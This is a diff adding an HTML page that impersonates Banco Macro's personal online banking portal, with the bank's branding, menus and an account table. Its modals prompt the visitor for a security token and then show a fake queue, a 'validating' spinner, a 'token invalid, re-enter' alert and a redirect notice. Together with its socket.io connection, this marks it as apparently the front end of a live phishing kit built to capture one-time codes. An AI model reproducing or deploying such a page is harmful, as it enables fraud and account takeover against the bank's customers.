@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Macro | Banca Internet Personas</title>
+    <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/css/home.css">
+</head>
+
+<body>
+    <div id="header">
+        <div id="header-top">
+            <div id="header-logo">
+                <img src="/img/logo_a (1).png" alt="Banco Macro">
+            </div>
+            <div class="header-info">
+                <div id="info-person">
+                    <p id="name"></p>
+                    <p id="conn"></p>
+                </div>
+                <div class="settings"></div>
+                <div class="message"></div>
+                <div class="logout">
+                    <button>Salir</button>
+                </div>
+            </div>
+        </div>
+        <div class="container-menu-bar">
+            <ul class="menu-bar">
+                <li>
+                    <img src="/img/inicio_icn_off.png">
+                    <span>Inicio</span>
+                </li>
+                <li>
+                    <img src="/img/transferencias_icn_off.png">
+                    <span>Transferencias</span>
+                </li>
+                <li>
+                    <img src="/img/pagos_icn_off.png">
+                    <span>Pagos</span>
+                </li>
+                <li>
+                    <img src="/img/recarga_icn_off.png">
+                    <span>Recargas</span>
+                </li>
+                <li>
+                    <img src="/img/invertir_icn_off.png">
+                    <span>Inversiones</span>
+                </li>
+                <li>
+                    <img src="/img/seguros_icn_off.png">
+                    <span>Seguros</span>
+                </li>
+                <li>
+                    <img src="/img/comprobantes_icn_off.png">
+                    <span>Consultas y Solicitudes</span>
+                </li>
+                <li>
+                    <img src="/img/mas_icn_off.png">
+                    <span>Más</span>
+                </li>
+                <div id="preloader-nav"> </div>
+            </ul>
+        </div>
+    </div>
+    <div id="personal-options">
+        <div id="ppal-content">
+            <div id="balance">
+                <div class="header-ppal-content">
+                    <img src="/img/cuentas_icn_a.png">
+                    <h1>Cuentas</h1>
+                    <img style="position: absolute; right: 0; cursor: pointer;" src="/img/flechaCierraBlanca.png">
+                </div>
+                <div class="body-content">
+                    <div id="nombre-cuenta">
+                        Caja de ahorro
+                    </div>
+                    <table id="datos-cuenta">
+                        <tbody>
+                            <tr class="head">
+                                <th style="width: 50%;">Nombre</th>
+                                <th>Número</th>
+                                <th>Saldo disponible</th>
+                            </tr>
+                            <tr class="body">
+                                <td id="info-nombre">
+                                    <img style="width: 30px; position: relative; top: -2px;" src="/img/Spinner-macro-Azul-Rota.gif">
+                                </td>
+                                <td id="info-numero">
+                                    <img style="width: 30px; position: relative; top: -2px;" src="/img/Spinner-macro-Azul-Rota.gif">
+                                </td>
+                                <td id="info-saldo">
+                                    <img style="width: 30px; position: relative; top: -2px;" src="/img/Spinner-macro-Azul-Rota.gif">
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            <div class="banner">
+                <img src="/img/selecta_banner_posicionconsolidada_der_360x80px.jpg">
+            </div>
+        </div>
+        <div id="puntos-acumulados">
+            <div id="cantidad-puntos">
+                <h3>Tenés acumulados <b>0 puntos</b></h3>
+            </div>
+            <a href="">Ingresá</a>
+            <div class="logos-aliados">
+                <div class="logo" style="background-image: url('/img/logo-Macropremia-2.png')"></div>
+                <div class="logo" style="background-image: url('/img/logo-Despegar-2.png')"></div>
+            </div>
+        </div>
+    </div>
+    <footer class="footer" id="footer">
+        <div class="content">
+            <ul>
+                <li>
+                    <a style="display: inline-block;  white-space: nowrap;  width: 20%;" href="">Preguntas
+                        frecuentes</a>
+                    <a style="display: inline-block;  white-space: nowrap;  width: 13%;" href="">Seguridad</a>
+                    <a style="display: inline-block;  white-space: nowrap;  width: 18%;" href="">Teléfonos útiles</a>
+                    <a style="display: inline-block;  white-space: nowrap; width: 20%;" href="">Terminos y
+                        condiciones</a>
+                    <a style="display: inline-block;  white-space: nowrap;  width: 25%;" href="">Comparativo de
+                        comisiones</a>
+                </li>
+            </ul>
+        </div>
+    </footer>
+    <div id="token">
+        <div class="modal">
+            <div class="modal-header">
+                <h4>Alejate de las estafas virtuales</h4>
+            </div>
+            <div class="modal-body">
+                <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Voluptate, officiis. Ab deserunt in eius
+                    eos optio laborum dolorum aut sequi distinctio qui ut, excepturi quaerat ipsa. Maxime, nemo! Facere,
+                    dicta.</p>
+                <form id="formToken">
+                    <input required type="text" id="token-input" name="token">
+                    <button type="submit" id="sendToken">Enviar token</button>
+                </form>
+                <div id="spinnerValidate">
+                    <span>Validando información...</span>
+                    <img src="/img/Spinner-macro-Azul-Rota.gif" alt="">
+                </div>
+            </div>
+            <div class="modal-footer">
+
+            </div>
+        </div>
+    </div>
+    <div id="queuelist">
+        <div class="modal">
+            <div class="modal-header">
+                <h4>Estamos preparando todo para ti</h4>
+            </div>
+            <div class="modal-body">
+                <p>En estos momentos tenemos un alto flujo de usuarios conectados.</p>
+                <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Cupiditate omnis eos obcaecati quaerat eius nobis consectetur esse earum quos.</p>
+                <div id="spinnerQueue">
+                    <p>No te desconectes, en breve serás atendido</p>
+                    <img src="/img/Spinner-macro-Azul-Rota.gif" alt="">
+                </div>
+            </div>
+            <div class="modal-footer">
+
+            </div>
+        </div>
+    </div>
+    <div class="modal-alerta" id="alert-modal">
+        <div>
+            <p>El <b>token</b> de seguridad ingresado tiene un formato incorrecto, por favor <b>ingréselo nuevamente</b></p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal">
+            <img src="/img/bt.cerrar.modal.gif">
+        </div>
+    </div>
+    <div class="modal-alerta" id="noValidate">
+        <div>
+            <p><b>No pudimos validar su informacion</b>, ingrese su token nuevamente</p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal-resendtoken">
+            <img src="/img/bt.cerrar.modal.gif">
+        </div>
+    </div>
+    <div class="modal-alerta green" id="validate">
+        <div>
+            <p>Vuelva a <b>iniciar sesión</b>, en breve será redireccionado...</p>
+        </div>
+        <div class="cerrar-modal" id="close-alert-modal-green">
+            <img src="/img/bt.cerrar.modal.gif">
+        </div>
+    </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/home.js"></script>
+</body>
+
+</html>
